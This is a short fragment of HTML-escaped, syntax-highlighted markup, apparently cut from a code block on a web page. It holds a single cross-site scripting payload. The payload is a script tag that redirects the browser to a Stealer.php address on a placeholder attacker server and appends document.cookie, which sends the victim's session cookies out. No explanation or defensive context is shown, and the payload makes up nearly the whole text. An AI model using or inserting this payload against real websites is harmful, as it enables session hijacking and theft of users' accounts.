&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;script&amp;gt;document.location.href &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;http://&amp;lt;YOUR_SERVER_IP&amp;gt;/Stealer.php?cookie=&amp;#39;&lt;/span>+document.cookie&amp;lt;/script&amp;gt;
